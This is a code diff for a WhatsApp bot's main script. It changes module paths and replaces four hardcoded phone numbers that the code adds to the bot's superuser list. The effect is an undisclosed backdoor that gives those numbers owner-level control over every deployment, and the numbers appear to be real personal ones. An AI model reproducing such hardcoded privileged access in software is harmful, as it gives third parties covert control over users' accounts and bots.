@@ -44,12 +44,12 @@ const FileType = require('file-type');
 const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
 //import chalk from 'chalk'
 const { verifierEtatJid , recupererActionJid } = require("./lib/antilien");
-let evt = require(__dirname + "/zokou/");
+let evt = require(__dirname + "/framework/zokou/");
 const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./lib/banUser");
 const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./lib/banGroup");
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./lib/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
-let { reagir } = require(__dirname + "/zokou/app");
+let { reagir } = require(__dirname + "/framework/app");
 var session = conf.session.replace(/BELTAH;;;/g,"");
 const prefixe = conf.PREFIXE;
 const more = String.fromCharCode(8206)
@@ -1276,10 +1276,10 @@ if (conf.AUTO_TAG_STATUS === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./lib/sudo");
             const nomAuteurMessage = ms.pushName;
-            const abu1 = '254710772666';
-            const abu2 = '254710772666';
-            const abu3 = "254710772666";
-            const abu4 = '254710772666';
+            const abu1 = '254114141192';
+            const abu2 = '254737681758';
+            const abu3 = "254114141192";
+            const abu4 = '254737681758';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
